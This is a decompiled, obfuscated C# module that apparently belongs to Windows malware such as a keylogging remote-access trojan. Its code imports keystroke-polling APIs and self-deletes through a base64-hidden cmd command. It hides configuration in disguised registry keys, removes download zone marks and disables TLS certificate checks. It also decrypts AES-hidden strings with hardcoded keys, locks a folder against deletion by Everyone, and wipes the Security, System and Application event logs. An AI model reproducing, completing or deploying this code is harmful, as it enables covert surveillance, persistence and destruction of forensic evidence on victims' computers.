using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns10;
using ns15;

namespace ns14;

[StandardModule]
internal sealed class Class0
{
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern short GetAsyncKeyState(int int_0);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int int_0, int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	[DllImport("kernel32.dll")]
	public static extern bool LoadLibrary(string string_0);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern ushort GetKeyboardLayout([In] int int_0);

	public static ushort smethod_0()
	{
		return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern int GetWindowThreadProcessId([In] IntPtr intptr_0, [Optional][Out] IntPtr intptr_1);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	public static object smethod_1()
	{
		Interaction.Shell(smethod_4(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) + "\"" + Application.get_ExecutablePath() + "\"", (AppWinStyle)0, false, -1);
		object result = default(object);
		return result;
	}

	public static bool smethod_2()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte[] smethod_3(string string_0)
	{
		return Encoding.UTF8.GetBytes(string_0);
	}

	public static string smethod_4(byte[] byte_0)
	{
		return Encoding.UTF8.GetString(byte_0);
	}

	public static object smethod_5(string string_0)
	{
		object result = default(object);
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost\\" + GClass14.smethod_5()).DeleteValue(string_0);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_6(string string_0)
	{
		try
		{
			return Conversions.ToString(Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost\\" + GClass14.smethod_5()).GetValue(string_0, ""));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_7(string string_0)
	{
		try
		{
			return Conversions.ToString(Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reboot").GetValue(string_0, ""));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_8(string string_0, string string_1)
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reboot").SetValue(string_0, string_1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_9(string string_0, string string_1)
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost\\" + GClass14.smethod_5()).SetValue(string_0, string_1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_10(string string_0)
	{
		try
		{
			return Conversions.ToString(Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WinLicense").GetValue(string_0, ""));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_11(string string_0, string string_1)
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WinLicense").SetValue(string_0, string_1);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static Array smethod_12(byte[] byte_0, string string_0)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(smethod_4(byte_0), string_0, -1, (CompareMethod)0);
		memoryStream.Write(byte_0, 0, array[0].Length);
		memoryStream2.Write(byte_0, array[0].Length + string_0.Length, byte_0.Length - (array[0].Length + string_0.Length));
		list.Add(memoryStream.ToArray());
		list.Add(memoryStream2.ToArray());
		memoryStream.Dispose();
		memoryStream2.Dispose();
		return list.ToArray();
	}

	public static void smethod_13(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Invalid comparison between Unknown and I4
		if ((int)e.get_Reason() == 1)
		{
			GClass10.smethod_1();
		}
		else if ((int)e.get_Reason() == 2)
		{
			GClass10.smethod_1();
		}
	}

	public static byte[] smethod_14(byte[] byte_0, ref bool bool_0)
	{
		if (bool_0)
		{
			byte[] array = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true);
				gZipStream.Write(byte_0, 0, byte_0.Length);
				gZipStream.Dispose();
				memoryStream.Position = 0L;
				array = new byte[(int)memoryStream.Length + 1 - 1 + 1];
				memoryStream.Read(array, 0, array.Length);
				memoryStream.Dispose();
			}
			return array;
		}
		byte[] array2 = null;
		using (MemoryStream memoryStream2 = new MemoryStream(byte_0))
		{
			GZipStream gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
			byte[] array3 = new byte[4];
			memoryStream2.Position = memoryStream2.Length - 5L;
			memoryStream2.Read(array3, 0, 4);
			int num = BitConverter.ToInt32(array3, 0);
			memoryStream2.Position = 0L;
			array2 = new byte[num - 1 + 1 - 1 + 1];
			gZipStream2.Read(array2, 0, num);
			gZipStream2.Dispose();
			memoryStream2.Dispose();
		}
		return array2;
	}

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true, ThrowOnUnmappableChar = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile([MarshalAs(UnmanagedType.LPTStr)] string string_0);

	public static void smethod_15(string string_0)
	{
		try
		{
			DeleteFile(string_0 + ":Zone.Identifier");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool smethod_16(object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0)
	{
		return true;
	}

	public static object smethod_17(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("はνたוםνבまきはלרντרοερあניεπ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static string smethod_18(int int_0)
	{
		string source = "1234567890";
		return new string(source.OrderBy((char n) => Guid.NewGuid()).Take(int_0).ToArray());
	}

	public static string smethod_19(int int_0)
	{
		string source = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
		return new string(source.OrderBy((char n) => Guid.NewGuid()).Take(int_0).ToArray());
	}

	public static void smethod_20(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(isProtected: false, preserveInheritance: true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_21(string string_0)
	{
		try
		{
			string value = new SecurityIdentifier(WellKnownSidType.WorldSid, null).Translate(typeof(NTAccount)).Value;
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.Read, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.DeleteSubdirectoriesAndFiles, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.ListDirectory, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.ReadPermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.AppendData, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.SetAccessRuleProtection(isProtected: true, preserveInheritance: true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object smethod_22(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static object smethod_23(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("あאがנρצρיאまנצאצあはצצנבינと", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static object smethod_24(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("あときはたהまנがたנκהלτליあとαすなו", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static object smethod_25(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("احزترمئلخشغصطالاركجوزبز", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static object smethod_26(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("صلشثلخطعمغدبریصحؤجڤوففل", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static object smethod_27(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("νרるππκבצאρままでたדצまלהדρνל", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static object smethod_28(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("عسۆعغشجهطءشتیدلزطءهیمشا", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static object smethod_29(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static object smethod_30()
	{
		object result = default(object);
		try
		{
			if (EventLog.Exists("Application"))
			{
				EventLog.Delete("Application");
			}
			if (EventLog.Exists("Security"))
			{
				EventLog.Delete("Security");
			}
			if (EventLog.Exists("State"))
			{
				EventLog.Delete("State");
			}
			if (EventLog.Exists("System"))
			{
				EventLog.Delete("System");
			}
			if (EventLog.Exists("EventLog"))
			{
				EventLog.Delete("EventLog");
				return result;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
